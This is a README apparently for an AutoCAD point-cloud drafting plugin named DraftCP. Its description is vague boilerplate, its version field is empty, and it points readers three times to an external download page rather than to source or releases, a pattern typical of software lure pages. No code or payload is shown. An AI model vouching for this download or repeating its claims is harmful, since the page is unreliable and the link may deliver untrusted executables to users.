# DraftCP - AutoCAD plugin 2026

> **DraftCP brings point cloud-based 2D drafting into AutoCAD through a plugin workflow designed for the current 2026 release cycle.**

[![Platform](https://img.shields.io/badge/Platform-AutoCAD-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/benpricerqbe398/draftcp-plugin-2026?style=flat-square)](https://github.com/benpricerqbe398/draftcp-plugin-2026)

---

<p align="center">
  <a href="https://benpricerqbe398.github.io/draftcp-plugin-2026/">
    <img src="https://img.shields.io/badge/Download-DraftCP%20Latest-brightgreen?style=for-the-badge" alt="Download DraftCP">
  </a>
</p>

> **[Download DraftCP v](https://benpricerqbe398.github.io/draftcp-plugin-2026/)**

---

[Download Latest Build](https://benpricerqbe398.github.io/draftcp-plugin-2026/)

---

## What DraftCP Provides

DraftCP gives AutoCAD users a dedicated way to create 2D drawings from point cloud information. The plugin keeps the work inside AutoCAD, connecting point cloud references with the drafting tools and processes users already rely on.

It is intended for CAD operators, drafting groups, and technical professionals who need to move from scanned spatial information to 2D drawing work. By keeping the workflow AutoCAD-centered, DraftCP provides a practical approach to point cloud-oriented drafting.

---

## Capabilities

- Works as an AutoCAD plugin
- Supports 2D drawing and drafting workflows
- Enables drafting based on point cloud sources
- Built for drawing tasks that use point cloud data
- Operates as part of an AutoCAD-focused process
- Supports technical drafting pipelines
- Concentrates on producing practical drafting output

---

## Getting Started

1. Download or clone the repository:
   - `git clone https://github.com/benpricerqbe398/draftcp-plugin-2026.git
2. Copy the plugin files into the AutoCAD add-in directory or the project folder.
3. Load DraftCP in AutoCAD through the extension or startup method normally used by your installation.
4. Start AutoCAD and open the DraftCP workflow from the installed plugin entry.

When using a packaged build from the download page, use the supplied directory structure and launch instructions for your AutoCAD configuration.

---

## Workflow

1. Open AutoCAD after installing DraftCP.
2. Load the point cloud source that will serve as the drafting reference.
3. Start the DraftCP workflow from the plugin.
4. Follow the available drafting operations to create 2D output from the point cloud.
5. Save the completed drawing in the AutoCAD format you prefer.

The workflow is suitable for repeated drafting tasks involving multiple point cloud sources while maintaining a consistent process within AutoCAD.

---

## Configuration and File Layout

When configuration files are included with a build, keep them alongside the plugin package or in the AutoCAD add-in settings directory used by the installation.

Example layout:

    DraftCP/
      config/
        settings.json
      plugin/
        DraftCP files

Builds without an editable configuration file should use the AutoCAD load path and the default settings bundled with the release.

---

## System Requirements

- AutoCAD
- A Windows desktop environment appropriate for running AutoCAD plugins
- Point cloud data for the intended drafting work
- Enough local storage for the plugin and project files

---

## Common Questions

**How can I find newer versions?**  
Visit the release or download link periodically to check for the most recent build.

**Where does DraftCP keep its settings?**  
The location varies by package. Check for a configuration directory included with the build, or inspect the AutoCAD add-in location selected during installation.

**Why is the plugin not loading?**  
Verify that the files are placed in a location supported by AutoCAD and that DraftCP is being loaded through the extension or startup procedure normally used in your setup.

**Does DraftCP work without point cloud data?**  
DraftCP is intended primarily for creating 2D drafts from point cloud data, so that is the workflow it is designed to support.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
